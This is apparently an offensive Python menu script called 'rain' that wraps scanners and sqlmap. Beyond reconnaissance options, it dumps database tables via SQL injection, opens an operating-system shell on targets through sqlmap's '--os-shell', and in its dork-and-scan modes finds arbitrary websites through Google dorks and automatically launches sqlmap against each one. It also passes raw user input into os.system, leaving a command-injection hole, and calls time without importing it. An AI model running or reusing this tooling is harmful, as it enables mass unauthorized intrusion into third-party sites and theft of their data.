import os
import colorama
from subprocess import call
from colorama import Fore, Style
import datetime
from googlesearch import search, get_tbs

colorama.init(autoreset=True)

print(Fore.LIGHTGREEN_EX +""" 
========================================
           _       
          (_)      
 _ __ __ _ _ _ __  
| '__/ _` | | '_ \ 
| | | (_| | | | | |
|_|  \__,_|_|_| |_|
discord: rain#1000                
""")

print(Fore.LIGHTYELLOW_EX +"""
[1] advanced scan with nmap 
[2] directory hunter with gobuster
[3] directory hunter with dirb
[4] admin login hunter with gobuster
[5] check vulns with nikto 
[6] check vulns with skipfish
[7] find subdomains with subfinder
[8] find info about target with whois 
[9] find exploits with searchsploit

// SQLMAP

[M] scan multiple websites with sqlmap
[D] google hacking / dorks
[SS] sqli attack with sqlmap 
[SH] upload a shell with sqlmap
[DS] auto scan with dork & sqlmap
[WS] new window scan with sqlmap & dork (for linux only)

""")
at = input(Fore.LIGHTGREEN_EX +"option => ")

if at == "1" :
   atnmap = input("ip or url => ") 
   os.system("sudo nmap -A -F " + atnmap + "")
           
if at == "2" : 
   atw = input("url => ")
   atdir = input("wordlist dir => ")
   os.system("gobuster dir -u " + atw + " -w " + atdir + "") 

if at == "3" :
   atdir = input("url => ")
   os.system("dirb " + atdir + " -w")

if at == "4" :
   atadm = input("url => ")
   atdir = input("wordlist dir => ")
   os.system("gobuster dir -u " + atadm + " -w " + atdir + "")

if at == "5" :
   atnikto = input("url => ") 
   os.system("nikto -h " + atnikto + "")
           
if at == "6" :
    atskipfish = input("url => ")
    os.system("skipfish -o fstscan " + atskipfish + "")
           
if at == "7" :
    atsubfinder = input("url => ")
    os.system("subfinder -d " + atsubfinder + "")
           
if at == "8" :
   atwhois = input ("domain => ")
   os.system("whois " + atwhois + "")
           
if at == "9" :
   atss = input("exploit => ")
   os.system("searchsploit " + atss +"")
           
if at == "SS" :
   url = input("url => ")
   os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 --dbs")
   db = input("db name => ")
   os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " --tables")
   table = input("table => ")
   os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " -T" + table + " --dump")

if at == "M" :
    multi = open("urls.txt", "r")
    for url in multi:
        print(url+" starting...")
        os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 --dbs")
        db = input("db name => ")
        os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " --tables")
        table = input("table => ")
        os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " -T" + table + " --dump")

if at == "SH" : 
    url = input("url => ")
    print(Fore.RED+"""
    [!] YOU WILL ONLY BE ABLE TO UPLOAD A 
    SHELL IF IT SHOWS "dba: True"
    """)
    os.system("sqlmap -u " + url + " --current-user --is-dba")
    os.system("sqlmap -u "+ url + " --os-shell")       
           
if at == "D" :
   searchterm = input(f'{Fore.GREEN}dork => {Fore.WHITE}')
   searchnumber = input(f'{Fore.GREEN}how many websites do u want? => {Fore.WHITE}')
   searchnumber = int(searchnumber)

   for i in search(
    searchterm, 
    tld="com", 
    num=searchnumber, 
    stop=searchnumber, 
    pause=2,
    tbs=get_tbs(
        datetime.date(2021, 1, 1),
        datetime.date(2022, 4, 1))
   ):
    print(Fore.RED + '[!]', Fore.LIGHTBLUE_EX + i)

if at == "DS" :
   dork = input(f'{Fore.GREEN}dork => {Fore.WHITE}')

   for i in search(
    dork,
    tld="com", 
    num=1, 
    pause=1,
    tbs=get_tbs(
        datetime.date(2021, 1, 1),
        datetime.date(2022, 4, 1))
   ):
    time.sleep(4.0)
    print(Fore.YELLOW+"HUNTING... PLEASE WAIT!")
    print(Fore.GREEN +"[:] DORK INSERTED: " + dork, '\n' + Fore.RED +"[!] WEBSITE FOUND: " + i)
    time.sleep(10.0)
    call(["sqlmap", i ,"--dbs", "--random-agent"])

if at == "WS" :
   os.system("konsole --hold -e  python sqlihunter.py")
